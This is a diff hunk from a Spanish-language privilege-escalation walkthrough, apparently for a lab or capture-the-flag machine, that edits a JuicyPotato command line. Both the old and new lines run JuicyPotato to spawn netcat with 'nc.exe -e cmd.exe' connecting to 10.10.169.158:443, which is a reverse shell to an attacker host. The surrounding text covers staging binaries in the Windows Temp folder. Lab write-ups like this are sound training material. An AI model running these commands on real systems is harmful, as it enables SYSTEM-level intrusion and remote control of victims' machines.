@@ -167,7 +167,7 @@ Recuerda, este proceso de copiar a la máquina víctima requiere que coloques lo
 
 Finalmente, ejecutamos el **JuicyPotato** como de costumbre:
 
-	./JP.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\privesc\nc.exe -e cmd.exe 10.10.169.158 443" -t *
+	JP.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\privesc\nc.exe -e cmd.exe 10.10.169.158 443" -t *
 
 Nuevamente hemos colocado los binarios en un directorio personalizado con permisos de escritura dentro del directorio **Temp** de Windows. Olvidé mencionar en la máquina pasada que el puerto de el servidor COM es casi siempre por defecto 1337, así que puedes seguir usándolo aquí también.	
 
